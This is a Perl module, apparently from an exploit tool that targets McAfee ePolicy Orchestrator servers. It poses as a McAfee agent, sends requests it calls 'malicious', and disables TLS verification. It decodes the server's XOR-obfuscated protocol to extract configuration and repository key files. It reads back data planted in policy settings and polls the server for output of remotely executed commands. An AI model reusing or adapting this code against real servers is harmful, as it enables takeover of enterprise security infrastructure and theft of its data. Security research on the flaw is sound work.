package Epowner::Epo;


use XML::Simple;
use Data::Dumper;

use strict;
use warnings;

# git-issue-1
IO::Socket::SSL::set_ctx_defaults(SSL_verify_mode => SSL_VERIFY_NONE);
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;


#============================================================#
# Send a McAfee HTTP POST Request                            #
#============================================================#
sub send_http_request{
        my $this 	= shift;
	my $post_data 	= shift;

        # init browser
	my $ua  = LWP::UserAgent->new (ssl_opts => { 
							verify_hostname => 0,
					  		SSL_verify_mode => SSL_VERIFY_NONE 
						}
				);
#	$ua->ssl_opts( verify_hostname => 0 );
        $ua->agent("Mozilla/4.0 (compatible; SPIPE/3.0; Windows)");


	# init request
        my $req = HTTP::Request->new();
	$req->method("POST");
	$req->uri(	"https://" . $this->{server_host} .":". $this->{server_port} . 
			"/spipe/pkg?AgentGuid=" .$this->{agent_guid} . "&Source=Agent_3.0.0 HTTP/1.1");
        $req->content_type('application/octet-stream');         
        $req->header(Accept => "application/octet-stream");
        $req->content($post_data);

	# Sending ...
	print "      [+] Sending malicious request (please wait...)\n" if $this->{verbose};
        my $res = $ua->request($req);
        if ( ! $res->is_success) {
                $this->print_err ("[-] HTTP Request failed with error '" . $res->status_line . "'.. :( \n") ;
		if($res->code eq "503"){
			$this->print_data("    Could be related to an invalid (too small) sequence number. I will increasing it for you\n");
			$this->print_data("    Please try again ...\n");
			$this->{agent_seqnum}+=100;
			$this->config_save();
		}
		exit;
        }
	

	return $res->content;
}


#============================================================#
# Get a page (poll until the page exists)                    #
#============================================================#
sub http_poll_uri_get {

	my $this = shift;
	my $uri = shift;

        my $get_request = HTTP::Request->new;
        $get_request->method('GET');
	$get_request->uri($uri);

        #my $user_agent  = LWP::UserAgent->new (ssl_opts => { verify_hostname => 0 });
        my $user_agent  = LWP::UserAgent->new (ssl_opts => { 
                                                        verify_hostname => 0,
                                                        SSL_verify_mode => SSL_VERIFY_NONE 
                                                }
                                        );

        my $response;
        my $body = 0;

        #if($this->{server_is_dba} and not $this->{server_force_nondba}){
        if($this->{srv_exec_mode} == 1 and not $this->{server_force_nondba}){
                print "      [+] polling $uri : " ;
                $response = $user_agent->request($get_request);
                if ($response->code eq "200"){
                        print " found!\n";
                        $body = $response->content;
                }else{
                        print " not found..\n" ;
                        print "[-] ERROR (http_poll_uri_get): can't download $uri\n";
                        return 0;
                }
        }else{
                # in non-dba cmd exec mode, the previous 'copy' command is run asynchronously
                # give a few try here..
                for(my $i=0;$i<20;$i++){
                        print "      [+] polling $uri : " ;
                        $response = $user_agent->request($get_request);
                        if ($response->code eq "200"){
                                print " found!\n";
                                $body =  $response->content;
                                $i =20; #exit loop
                        }else{
                                print " not found. Retrying in 10 sec ...\n" ;
                                sleep(10);
                        }
                }
                if ($response->code ne "200"){
                        print "[-] ERROR (http_poll_uri_get): can't download $uri\n";
                        return 0;
                }
        }

	return $body;

}


#============================================================#
# HTTP Response: Parse 'Server.xml'                          #
#============================================================#
sub parse_server_xml {

	# NOTE : I'm not really pride of this function
	# It was my first time with XML::Simple


	my $this = shift;
	my $xml_str = shift;

	my @output;	# to return

	# read XML
	my $xml = new XML::Simple;
	my $data = $xml->XMLin(	$xml_str, 
				ForceArray => 0,
				KeyAttr => {	Policy => 'PathID',
						Product => 'SoftwareID',
						Setting => 'name',
						Section => 'name'}
			);

	# print output
	my %policy_hash = %{$data->{'PolicyRoot'}->{'PolicyGroup'}->{'Policy'}};
	
	#print Dumper($data);

	foreach my $key( keys %policy_hash ){

		# if we find 'Product' but no 'Section, it means that we have multiple products
		if(defined($policy_hash{$key}{'Product'} )
		   && !defined($policy_hash{$key}{'Product'}{'Section'})){
			#print "must parse sub products\n";
			foreach my $key2 (keys %{$policy_hash{$key}{'Product'}}){
	                        if( defined($policy_hash{$key}{'Product'}{$key2}{'Section'}{'ProxySettings'})){
                                	#print "Found \n";
					# TODO: not sure we need this
                     		}
			}

		}else{
			# Otherwise, test for proxySettings
			if( defined($policy_hash{$key}{'Product'}{'Section'}{'ProxySettings'})){
				# parse setting
				foreach my $key2 (keys %{$policy_hash{$key}{'Product'}{'Section'}{'ProxySettings'}{'Setting'}} ){
					if($key2 =~ /epowner_data_/){
						my $value = $policy_hash{$key}{'Product'}{'Section'}{'ProxySettings'}{'Setting'}{$key2}{'content'};
						#print "   $value\n";
						push (@output, $value);
					}
				}
			}

		}
	}

	return (@output);

}



#============================================================#
# HTTP Response : Parse the McAfee data from the body        #
#============================================================#
sub parse_data_response {

        my $this = shift;
        my $data = shift;
        my %return ;


	# POLICY SERVER 
	#==============

	#00000000 01 00 11 00 50 6f 6c 69 63 79 5c 53 65 72 76 65 |....Policy\Serve|
	#00000010 72 2e 78 6d 6c 0d 28 00 00 3c 3f 78 6d 6c 20 76 |r.xml.(..<?xml v|
	#00000020 65 72 73 69 6f 6e 3d 22 31 2e 30 22 20 65 6e 63 |ersion="1.0" enc|
	#00000030 6f 64 69 6e 67 3d 22 55 54 46 2d 38 22 20 3f 3e |oding="UTF-8" ?>|

	# Where is defined Server.xml ?
	my $server_xml_position = index($data, "Policy\\Server.xml");
	if($server_xml_position eq -1){
		print "[-] ERROR: Could not find 'Policy\\Server.xml' in the HTTP response\n";
		exit;
	}

        # get server.xml content
        my $server_xml = substr($data, $server_xml_position + length("Policy\\Server.xml"));
	
	# get server.xml len
	my $server_xml_len = substr($server_xml, 0, 4);
	$server_xml_len = unpack("V", $server_xml_len);
	$return{'server_xml_len'} = $server_xml_len;
	#print $server_xml_len . "\n";

	# remove len
        $server_xml = substr($server_xml, 4);

	# finalise server.xml content
        $server_xml = substr($server_xml, 0, $server_xml_len);
        $return{'server_xml'} = $server_xml;
	#print $server_xml . "\n";
	



        # REPOKEY.INI
        #===============


	#00002800 61 73 6b 47 72 6f 75 70 3e 0d 0a 3c 2f 54 61 73 |askGroup>..</Tas|
	#00002810 6b 52 6f 6f 74 3e 0d 0a 3c 2f 41 67 65 6e 74 44 |kRoot>..</AgentD|
	#00002820 61 74 61 3e 0d 0a 02 00 0c 00 52 65 70 6f 4b 65 |ata>......RepoKe|
	#00002830 79 73 2e 69 6e 69 4a 0d 00 00 5b 52 65 70 6f 4b |ys.iniJ...[RepoK|
	#00002840 65 79 48 61 73 68 4c 69 73 74 5d 0d 0a 56 65 72 |eyHashList]..Ver|
	#00002850 73 69 6f 6e 3d 32 30 31 32 31 30 30 37 31 37 31 |sion=20121007171|
	#00002860 35 30 33 0d 0a 4c 69 73 74 3d 46 31 48 6a 74 54 |503..List=F1HjtT|


        # Where is defined repokey.ini ?
        my $repokeys_ini_position = index($data, "RepoKeys.ini");
        if($repokeys_ini_position eq -1){
                print "[-] ERROR: Could not find 'RepoKeys.ini' in the HTTP response\n";
                exit;
        }

        # get content
        my $repokeys_ini = substr($data, $repokeys_ini_position + length("RepoKeys.ini"));

        # get repokeys.ini len
        my $repokeys_ini_len = substr($repokeys_ini, 0, 4);
        $repokeys_ini_len = unpack("V", $repokeys_ini_len);
        $return{'repokeys_len'} = $repokeys_ini_len;
	#print $repokeys_ini_len . "\n"; 

        # remove len
        $repokeys_ini = substr($repokeys_ini, 4);

        # finalise content
        $repokeys_ini = substr($repokeys_ini, 0, $repokeys_ini_len);
        $return{'repokeys'} = $repokeys_ini;
	#print $repokeys_ini . "\n"; 



	# SITELIST.XML
	#===============
	
	#00003570 43 6e 35 56 63 67 67 57 4d 43 41 77 45 41 41 51 |Cn5VcggWMCAwEAAQ|
	#00003580 3d 3d 0d 0a 03 00 0c 00 53 69 74 65 4c 69 73 74 |==......SiteList|
	#00003590 2e 78 6d 6c 8c 0c 00 00 3c 6e 73 3a 53 69 74 65 |.xml....<ns:Site|
	#000035a0 4c 69 73 74 73 20 78 6d 6c 6e 73 3a 6e 73 3d 22 |Lists xmlns:ns="|
	#000035b0 6e 61 53 69 74 65 4c 69 73 74 22 20 47 6c 6f 62 |naSiteList" Glob|


        # Where is defined SiteList.xml ?
        my $sitelist_xml_position = index($data, "SiteList.xml");
        if($sitelist_xml_position eq -1){
                print "[-] ERROR: Could not find 'SiteList.xml' in the HTTP response\n";
                exit;
        }

        # get content
        my $sitelist_xml = substr($data, $sitelist_xml_position + length("SiteList.xml"));

        # get sitelist len
        my $sitelist_xml_len = substr($sitelist_xml, 0, 4);
        $sitelist_xml_len = unpack("V", $sitelist_xml_len);
        $return{'sitelist_len'} = $sitelist_xml_len;
	#print $sitelist_xml_len . "\n";

        # remove len
        $sitelist_xml = substr($sitelist_xml, 4);

        # finalise content
        $sitelist_xml = substr($sitelist_xml, 0, $sitelist_xml_len);
        $return{'sitelist'} = $sitelist_xml;
	#print $sitelist_xml . "\n";



	return \%return;
}




#============================================================#
# HTTP Response: Parse McAfee body                           #
#============================================================#
sub parse_http_response {

	my $this = shift;
	my $response = shift;
	my $response_type = shift || '';	# only one for now (fullprops)


	my %return ;

	# extract ePo structures
	#=======================

	# get header1 (fixed len of 234 bytes)
	#---------------------------------------
	my $header1 = substr($response, 0, 234);
	$header1 = xor_str($header1, 0xaa);	
	$return{'header1'} = $header1;


	# get header2 length from header1
	my $header2_len = substr($header1, 6, 4);
	$header2_len = unpack("V", $header2_len) - 234;
	$return{'header2_len'} = $header2_len; 
	#print "header2_len : $header2_len\n";

	# get header2
	#-------------
	my $header2 = substr($response, 234, $header2_len);
	$return{'header2'} = $header2;


	# get data len from header1
	my $data_len = substr($header1, 18, 4);
        $data_len = unpack("V", $data_len);
	$return{'data_len'} = $data_len;
	#print "data_len : $post_data_data_len\n";

	# get data
	#-------------
	my $data = substr($response, 234 + $header2_len, $data_len);
	
	# data is compressed and now holds:
	# - AgentData.xml
	# - RepoKeyHashList
	# - SiteList.xml

	# uncompressed lenght
	my $data_uncompressed_len = substr($data,0,4);
	$data_uncompressed_len = unpack("V", $data_uncompressed_len);

	# compressed lenght
        my $data_compressed_len = substr($data,4,4);
        $data_compressed_len = unpack("V", $data_compressed_len);

	#print "uncomp: $data_uncompressed_len \n";
	#print "comp:   $data_compressed_len \n";

	# remove len info
	$data = substr($data,8);

	# inflate data
	$data = uncompress_inflate($data);
	$return{'data'} = $data;
	$return{'data_len'} = length($data);;

	


	# debug: print hex             
#	my $res = '';#$data;
#	for(my $i=0;$i<length($res); $i++){
#       		printf "\\x%02x", (unpack("C",substr($res,$i,1)) );
#	       	if ($i ne 0 and ($i+1)%16 eq 0){
#		       print "\n";
#	       	}
#       	}
#       	print "\n";

	return \%return;
}


#====================================================================
# FUNCTION:  Test Connectivity with server
#====================================================================
sub check_connectivity{
        my $this = shift;
        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};
	my $s = IO::Socket::SSL->new(
                PeerHost => $server_host,
                PeerPort => $server_port,
                SSL_verify_mode => SSL_VERIFY_NONE);
                #or die "[-] ERROR in SSL Socket Creation to $server_host:$server_port\n    $!\n";
        if($s) { close $s; return 1;}
        else   { return 0;}
}

#====================================================================
# FUNCTION:  Test Connectivity with admin console (TODO: and perform fingerprint verif)
#====================================================================
sub check_connectivity_webconsole{
        my $this = shift;
        my $server_host = $this->{server_host};
        my $server_port = $this->{server_consoleport};
	my $s = IO::Socket::SSL->new(
                PeerHost => $server_host,
                PeerPort => $server_port,
                SSL_verify_mode => SSL_VERIFY_NONE);
                #or die "[-] ERROR in SSL Socket Creation to $server_host:$server_port\n    $!\n";
        if($s) { 
		close $s; 
		return 1;
	} else   { return 0;}
}


1;
